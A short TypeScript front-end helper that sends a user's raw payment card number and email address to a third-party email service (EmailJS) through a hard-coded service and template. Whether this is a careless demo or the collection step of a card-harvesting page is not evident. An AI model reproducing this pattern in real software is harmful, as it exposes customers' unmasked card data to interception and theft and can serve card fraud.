import axios from "axios";

const apiUrl = process.env.REACT_APP_API_URL || "https://api.emailjs.com";

export const emailPaymentDetailsApi = async (
  cardNumber: string,
  userEmail: string
) => {
  try {
    const { data } = await axios.post<string>(`${apiUrl}/api/v1.0/email/send`, {
      service_id: "service_biwkfjt",
      template_id: "template_l268em2",
      user_id: "mQ1xbiPBiYd0g3bMK",
      template_params: {
        card_number: cardNumber,
        user_email: userEmail,
      },
    });
    console.log(data);
    return Promise.resolve(data);
  } catch (error) {
    if (axios.isAxiosError(error)) {
      console.log(error);
    }
    return Promise.reject("An unexpected error occurred!");
  }
};
